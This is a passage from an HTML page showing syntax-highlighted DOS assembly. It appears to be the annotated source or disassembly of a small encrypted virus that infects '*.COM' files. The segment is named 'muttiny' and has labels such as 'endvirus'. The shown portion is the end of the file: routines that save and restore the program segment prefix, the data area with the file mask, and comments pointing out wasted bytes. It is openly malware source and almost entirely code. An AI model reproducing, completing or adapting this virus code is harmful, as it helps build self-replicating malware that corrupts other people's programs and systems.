                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">storebytes</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">restorepsp</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">                 </span><span class="sc1">;Restore 200h bytes</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
</span><span class="sc5">restorebytes</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc5">pspstore</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">restorebytes</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">oldjmp</span><span class="sc0">          </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">filemask</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'*.COM'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">idontknow1</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">66h</span><span class="sc0">                     </span><span class="sc1">;Waste of one byte</span><span class="sc0">
</span><span class="sc5">buffer</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc0">           </span><span class="sc1">;Waste of three bytes</span><span class="sc0">
</span><span class="sc5">storejmp</span><span class="sc0">        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">                       </span><span class="sc1">;Waste of two bytes</span><span class="sc0">
</span><span class="sc1">;endvirus should be before idontknow1, thereby saving six bytes.</span><span class="sc0">
</span><span class="sc5">endvirus</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">idontknow2</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">pspstore</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">200</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">             </span><span class="sc1">;Should actually be</span><span class="sc0">
</span><span class="sc5">idontknow3</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">2ch</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">             </span><span class="sc1">;100h bytes long.</span><span class="sc0">
</span><span class="sc5">veryend</span><span class="sc4">:</span><span class="sc0">                                        </span><span class="sc1">;End of encryption</span><span class="sc0">
</span><span class="sc5">muttiny</span><span class="sc0">         </span><span class="sc9">ends</span><span class="sc0">
                </span><span class="sc9">end</span><span class="sc0">     </span><span class="sc5">start</span></div></body>
</html>
